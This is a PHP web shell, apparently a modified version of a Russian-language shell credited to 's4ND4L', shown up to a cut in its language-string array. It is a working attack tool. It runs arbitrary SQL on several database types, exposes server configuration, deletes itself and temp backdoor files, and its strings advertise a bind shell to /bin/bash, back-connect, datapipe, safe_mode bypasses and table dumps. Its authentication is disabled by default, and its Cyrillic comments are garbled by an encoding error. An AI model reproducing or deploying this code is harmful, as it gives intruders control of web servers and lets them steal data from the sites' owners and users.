<?php


error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = "69";
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_SERVER as $k=>$v)
  {
  $_SERVER[$k] = stripslashes($v);
  }
 }

/* ~~~ ÐÑƒÑ‚ÐµÐ½Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ†Ð¸Ñ ~~~ */

// $auth = 1; - ÐÑƒÑ‚ÐµÐ½Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ†Ð¸Ñ Ð²ÐºÐ»ÑŽÑ‡ÐµÐ½Ð°
// $auth = 0; - ÐÑƒÑ‚ÐµÐ½Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ†Ð¸Ñ Ð²Ñ‹ÐºÐ»ÑŽÑ‡ÐµÐ½Ð°
$auth = 0;

// Ð›Ð¾Ð³Ð¸Ð½ Ð¸ Ð¿Ð°Ñ€Ð¾Ð»ÑŒ Ð´Ð»Ñ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð° Ðº ÑÐºÑ€Ð¸Ð¿Ñ‚Ñƒ
// ÐÐ• Ð—ÐÐ‘Ð£Ð”Ð¬Ð¢Ð• Ð¡ÐœÐ•ÐÐ˜Ð¢Ð¬ ÐŸÐ•Ð Ð•Ð” Ð ÐÐ—ÐœÐ•Ð©Ð•ÐÐ˜Ð•Ðœ ÐÐ Ð¡Ð•Ð Ð’Ð•Ð Ð•!!!
$name='s4ND4L'; // Ð»Ð¾Ð³Ð¸Ð½ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ
$pass='test'; // Ð¿Ð°Ñ€Ð¾Ð»ÑŒ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_SERVER['PHP_AUTH_PW']!==$pass)
   {
   header('WWW-Authenticate: Basic realm="Modified By s4ND4L"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=http://unsecured-clanz.com>Modified By s4ND4L</a> : Access Denied</b>");
   }
}
$head = '<!-- Ð—Ð´Ñ€Ð°Ð²ÑÑ‚Ð²ÑƒÐ¹  Ð’Ð°ÑÑ -->
<html>
<head>
<title>---=Modified By Andika=--</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
.table1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
BACKGROUND-COLOR: #D4D0C8;
}
.td1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
font: 7pt Verdana;
}
.tr1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
}
table {
BORDER-RIGHT:  #eeeeee 1px outset;
BORDER-TOP:    #eeeeee 1px outset;
BORDER-LEFT:   #eeeeee 1px outset;
BORDER-BOTTOM: #eeeeee 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>';
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if ($_POST['cmd']=="db_query")
 {
  echo $head;
  switch($_POST['db'])
  {
  case 'MySQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }
  $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   	if(!empty($_POST['mysql_db'])) { @mysql_select_db($_POST['mysql_db'],$db); }
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query)
     {
      if(strlen($query)>5){
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @mysql_query($query,$db);
      $error = @mysql_error($db);
      if($error) { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }
      else {
      if (@mysql_num_rows($res) > 0)
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @mysql_fetch_assoc($res)))
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=Verdana size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
      else { if(($rows = @mysql_affected_rows($db))>=0) { echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } }
      }
      @mysql_free_result($res);
      }
     }
   	@mysql_close($db);
   }
  else echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MySQL server</b></font></div>";
  break;
  case 'MSSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }
  $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   	if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query)
     {
      if(strlen($query)>5){
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @mssql_query($query,$db);
      if (@mssql_num_rows($res) > 0)
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @mssql_fetch_assoc($res)))
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=Verdana size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
      /* else { if(($rows = @mssql_affected_rows($db)) > 0) { echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } else { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }} */
      @mssql_free_result($res);
      }
     }
   	@mssql_close($db);
   }
  else echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MSSQL server</b></font></div>";
  break;
  case 'PostgreSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }
  $str = "host='localhost' port='".$_POST['db_port']."' user='".$_POST['mysql_l']."' password='".$_POST['mysql_p']."' dbname='".$_POST['mysql_db']."'";
  $db = @pg_connect($str);
  if($db)
   {
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query)
     {
      if(strlen($query)>5){
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @pg_query($db,$query);
      $error = @pg_errormessage($db);
      if($error) { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }
      else {
      if (@pg_num_rows($res) > 0)
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @pg_fetch_assoc($res)))
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=Verdana size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
      else { if(($rows = @pg_affected_rows($res))>=0) { echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } }
      }
      @pg_free_result($res);
      }
     }
   	@pg_close($db);
   }
  else echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to PostgreSQL server</b></font></div>";
  break;
  case 'Oracle':
  $db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);
  if(($error = @ocierror())) { echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to Oracle server.<br>".$error['message']."</b></font></div>"; }
  else
   {
   $querys = @explode(';',$_POST['db_query']);
   foreach($querys as $num=>$query)
    {
    if(strlen($query)>5) {
    echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
    $stat = @ociparse($db, $query);
    @ociexecute($stat);
    if(($error = @ocierror())) { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error['message']."</b></font></td></tr></table><br>"; }
    else
     {
     $rowcount = @ocirowcount($stat);
     if($rowcount != 0) {echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rowcount."</b></font></td></tr></table><br>";}
     else {
     echo "<table width=100%><tr>";
     for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo "<td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".htmlspecialchars(@ocicolumnname($stat, $j))."&nbsp;</b></font></td>"; }
     echo "</tr>";
     while(ocifetch($stat))
      {
      echo "<tr>";
      for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo "<td><font face=Verdana size=-2>&nbsp;".htmlspecialchars(@ociresult($stat, $j))."&nbsp;</font></td>"; }
      echo "</tr>";
      }
     echo "</table><br>";
     }
     @ocifreestatement($stat);
     }
    }
    }
   @ocilogoff($db);
   }
  break;
  }
 echo "<form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center><textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>";
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
/*
Ð’Ñ‹Ð±Ð¾Ñ€ ÑÐ·Ñ‹ÐºÐ°
$language='ru' - Ñ€ÑƒÑÑÐºÐ¸Ð¹
$language='eng' - Ð°Ð½Ð³Ð»Ð¸Ð¹ÑÐºÐ¸Ð¹
*/
$language='eng';
$lang=array(
'ru_text1' =>'Ð’Ñ‹Ð¿Ð¾Ð»Ð½ÐµÐ½Ð½Ð°Ñ ÐºÐ¾Ð¼Ð°Ð½Ð´Ð°',
'ru_text2' =>'Ð’Ñ‹Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ðµ ÐºÐ¾Ð¼Ð°Ð½Ð´ Ð½Ð° ÑÐµÑ€Ð²ÐµÑ€Ðµ',
'ru_text3' =>'Ð’Ñ‹Ð¿Ð¾Ð»Ð½Ð¸Ñ‚ÑŒ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñƒ',
'ru_text4' =>'Ð Ð°Ð±Ð¾Ñ‡Ð°Ñ Ð´Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸Ñ',
'ru_text5' =>'Ð—Ð°Ð³Ñ€ÑƒÐ·ÐºÐ° Ñ„Ð°Ð¹Ð»Ð¾Ð² Ð½Ð° ÑÐµÑ€Ð²ÐµÑ€',
'ru_text6' =>'Ð›Ð¾ÐºÐ°Ð»ÑŒÐ½Ñ‹Ð¹ Ñ„Ð°Ð¹Ð»',
'ru_text7' =>'ÐÐ»Ð¸Ð°ÑÑ‹',
'ru_text8' =>'Ð’Ñ‹Ð±ÐµÑ€Ð¸Ñ‚Ðµ Ð°Ð»Ð¸Ð°Ñ',
'ru_butt1' =>'Ð’Ñ‹Ð¿Ð¾Ð»Ð½Ð¸Ñ‚ÑŒ',
'ru_butt2' =>'Ð—Ð°Ð³Ñ€ÑƒÐ·Ð¸Ñ‚ÑŒ',
'ru_text9' =>'ÐžÑ‚ÐºÑ€Ñ‹Ñ‚Ð¸Ðµ Ð¿Ð¾Ñ€Ñ‚Ð° Ð¸ Ð¿Ñ€Ð¸Ð²ÑÐ·ÐºÐ° ÐµÐ³Ð¾ Ðº /bin/bash',
'ru_text10'=>'ÐžÑ‚ÐºÑ€Ñ‹Ñ‚ÑŒ Ð¿Ð¾Ñ€Ñ‚',
'ru_text11'=>'ÐŸÐ°Ñ€Ð¾Ð»ÑŒ Ð´Ð»Ñ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð°',
'ru_butt3' =>'ÐžÑ‚ÐºÑ€Ñ‹Ñ‚ÑŒ',
'ru_text12'=>'back-connect',
'ru_text13'=>'IP-Ð°Ð´Ñ€ÐµÑ',
'ru_text14'=>'ÐŸÐ¾Ñ€Ñ‚',
'ru_butt4' =>'Ð’Ñ‹Ð¿Ð¾Ð»Ð½Ð¸Ñ‚ÑŒ',
'ru_text15'=>'Ð—Ð°Ð³Ñ€ÑƒÐ·ÐºÐ° Ñ„Ð°Ð¹Ð»Ð¾Ð² Ñ ÑƒÐ´Ð°Ð»ÐµÐ½Ð½Ð¾Ð³Ð¾ ÑÐµÑ€Ð²ÐµÑ€Ð°',
'ru_text16'=>'Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ',
'ru_text17'=>'Ð£Ð´Ð°Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ñ„Ð°Ð¹Ð»',
'ru_text18'=>'Ð›Ð¾ÐºÐ°Ð»ÑŒÐ½Ñ‹Ð¹ Ñ„Ð°Ð¹Ð»',
'ru_text19'=>'Exploits',
'ru_text20'=>'Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ',
'ru_text21'=>'ÐÐ¾Ð²Ð¾Ðµ Ð¸Ð¼Ñ',
'ru_text22'=>'datapipe',
'ru_text23'=>'Ð›Ð¾ÐºÐ°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¿Ð¾Ñ€Ñ‚',
'ru_text24'=>'Ð£Ð´Ð°Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ñ…Ð¾ÑÑ‚',
'ru_text25'=>'Ð£Ð´Ð°Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ð¿Ð¾Ñ€Ñ‚',
'ru_text26'=>'Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ',
'ru_butt5' =>'Ð—Ð°Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ',
'ru_text28'=>'Ð Ð°Ð±Ð¾Ñ‚Ð° Ð² safe_mode',
'ru_text29'=>'Ð”Ð¾ÑÑ‚ÑƒÐ¿ Ð·Ð°Ð¿Ñ€ÐµÑ‰ÐµÐ½',
'ru_butt6' =>'Ð¡Ð¼ÐµÐ½Ð¸Ñ‚ÑŒ',
'ru_text30'=>'ÐŸÑ€Ð¾ÑÐ¼Ð¾Ñ‚Ñ€ Ñ„Ð°Ð¹Ð»Ð°',
'ru_butt7' =>'Ð’Ñ‹Ð²ÐµÑÑ‚Ð¸',
'ru_text31'=>'Ð¤Ð°Ð¹Ð» Ð½Ðµ Ð½Ð°Ð¹Ð´ÐµÐ½',
'ru_text32'=>'Ð’Ñ‹Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ðµ PHP ÐºÐ¾Ð´Ð°',
'ru_text33'=>'ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ÑÑ‚Ð¸ Ð¾Ð±Ñ…Ð¾Ð´Ð° Ð¾Ð³Ñ€Ð°Ð½Ð¸Ñ‡ÐµÐ½Ð¸Ð¹ open_basedir Ñ‡ÐµÑ€ÐµÐ· Ñ„ÑƒÐ½ÐºÑ†Ð¸Ð¸ cURL',
'ru_butt8' =>'ÐŸÑ€Ð¾Ð²ÐµÑ€Ð¸Ñ‚ÑŒ',
'ru_text34'=>'ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ÑÑ‚Ð¸ Ð¾Ð±Ñ…Ð¾Ð´Ð° Ð¾Ð³Ñ€Ð°Ð½Ð¸Ñ‡ÐµÐ½Ð¸Ð¹ safe_mode Ñ‡ÐµÑ€ÐµÐ· Ñ„ÑƒÐ½ÐºÑ†Ð¸ÑŽ include',
'ru_text35'=>'ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ÑÑ‚Ð¸ Ð¾Ð±Ñ…Ð¾Ð´Ð° Ð¾Ð³Ñ€Ð°Ð½Ð¸Ñ‡ÐµÐ½Ð¸Ð¹ safe_mode Ñ‡ÐµÑ€ÐµÐ· Ð·Ð°Ð³Ñ€ÑƒÐ·ÐºÑƒ Ñ„Ð°Ð¹Ð»Ð° Ð² mysql',
'ru_text36'=>'Ð‘Ð°Ð·Ð°',
'ru_text37'=>'Ð›Ð¾Ð³Ð¸Ð½',
'ru_text38'=>'ÐŸÐ°Ñ€Ð¾Ð»ÑŒ',
'ru_text39'=>'Ð¢Ð°Ð±Ð»Ð¸Ñ†Ð°',
'ru_text40'=>'Ð”Ð°Ð¼Ð¿ Ñ‚Ð°Ð±Ð»Ð¸Ñ†Ñ‹ Ð±Ð°Ð·Ñ‹ Ð´Ð°Ð½Ð½Ñ‹Ñ…',
'ru_butt9' =>'Ð”Ð°Ð¼Ð¿',
'ru_text41'=>'Ð¡Ð¾Ñ…Ñ€Ð°Ð½Ð¸Ñ‚ÑŒ Ð² Ñ„Ð°Ð¹Ð»Ðµ',
'ru_text42'=>'Ð ÐµÐ´Ð°ÐºÑ‚Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¸Ðµ Ñ„Ð°Ð¹Ð»Ð°',
'ru_text43'=>'Ð ÐµÐ´Ð°ÐºÑ‚Ð¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ñ„Ð°Ð¹Ð»',
'ru_butt10'=>'Ð¡Ð¾Ñ…Ñ€Ð°Ð½Ð¸Ñ‚ÑŒ',
'ru_butt11'=>'Ð ÐµÐ´Ð°ÐºÑ‚Ð¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ',
'ru_text44'=>'Ð ÐµÐ´Ð°ÐºÑ‚Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¸Ðµ Ñ„Ð°Ð¹Ð»Ð° Ð½ÐµÐ²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾! Ð”Ð¾ÑÑ‚ÑƒÐ¿ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð´Ð»Ñ Ñ‡Ñ‚ÐµÐ½Ð¸Ñ!',
'ru_text45'=>'Ð¤Ð°Ð¹Ð» ÑÐ¾Ñ…Ñ€Ð°Ð½ÐµÐ½',
'ru_text46'=>'ÐŸÑ€Ð¾ÑÐ¼Ð¾Ñ‚Ñ€ phpinfo()',
'ru_text47'=>'ÐŸÑ€Ð¾ÑÐ¼Ð¾Ñ‚Ñ€ Ð½Ð°ÑÑ‚Ñ€Ð¾ÐµÐº php.ini',
'ru_text48'=>'Ð£Ð´Ð°Ð»ÐµÐ½Ð¸Ðµ Ð²Ñ€ÐµÐ¼ÐµÐ½Ð½Ñ‹Ñ… Ñ„Ð°Ð¹Ð»Ð¾Ð²',
'ru_text49'=>'Ð£Ð´Ð°Ð»ÐµÐ½Ð¸Ðµ ÑÐºÑ€Ð¸Ð¿Ñ‚Ð° Ñ ÑÐµÑ€Ð²ÐµÑ€Ð°',
'ru_text50'=>'Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ Ð¾ Ð¿Ñ€Ð¾Ñ†ÐµÑÑÐ¾Ñ€Ðµ',
'ru_text51'=>'Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ Ð¾ Ð¿Ð°Ð¼ÑÑ‚Ð¸',
'ru_text52'=>'Ð¢ÐµÐºÑÑ‚ Ð´Ð»Ñ Ð¿Ð¾Ð¸ÑÐºÐ°',
'ru_text53'=>'Ð˜ÑÐºÐ°Ñ‚ÑŒ Ð² Ð¿Ð°Ð¿ÐºÐµ',
'ru_text54'=>'ÐŸÐ¾Ð¸ÑÐº Ñ‚ÐµÐºÑÑ‚Ð° Ð² Ñ„Ð°Ð¹Ð»Ð°Ñ…',
'ru_butt12'=>'ÐÐ°Ð¹Ñ‚Ð¸',
'ru_text55'=>'Ð¢Ð¾Ð»ÑŒÐºÐ¾ Ð² Ñ„Ð°Ð¹Ð»Ð°Ñ…',
'ru_text56'=>'ÐÐ¸Ñ‡ÐµÐ³Ð¾ Ð½Ðµ Ð½Ð°Ð¹Ð´ÐµÐ½Ð¾',
'ru_text57'=>'Ð¡Ð¾Ð·Ð´Ð°Ñ‚ÑŒ/Ð£Ð´Ð°Ð»Ð¸Ñ‚ÑŒ Ð¤Ð°Ð¹Ð»/Ð”Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ',
'ru_text58'=>'Ð˜Ð¼Ñ',
'ru_text59'=>'Ð¤Ð°Ð¹Ð»',
'ru_text60'=>'Ð”Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ',
'ru_butt13'=>'Ð¡Ð¾Ð·Ð´Ð°Ñ‚ÑŒ/Ð£Ð´Ð°Ð»Ð¸Ñ‚ÑŒ',
'ru_text61'=>'Ð¤Ð°Ð¹Ð» ÑÐ¾Ð·Ð´Ð°Ð½',
'ru_text62'=>'Ð”Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸Ñ ÑÐ¾Ð·Ð´Ð°Ð½Ð°',
'ru_text63'=>'Ð¤Ð°Ð¹Ð» ÑƒÐ´Ð°Ð»ÐµÐ½',
'ru_text64'=>'Ð”Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸Ñ ÑƒÐ´Ð°Ð»ÐµÐ½Ð°',
'ru_text65'=>'Ð¡Ð¾Ð·Ð´Ð°Ñ‚ÑŒ',
'ru_text66'=>'Ð£Ð´Ð°Ð»Ð¸Ñ‚ÑŒ',
'ru_text67'=>'Chown/Chgrp/Chmod',
'ru_text68'=>'ÐšÐ¾Ð¼Ð°Ð½Ð´Ð°',
'ru_text69'=>'ÐŸÐ°Ñ€Ð°Ð¼ÐµÑ‚Ñ€1',
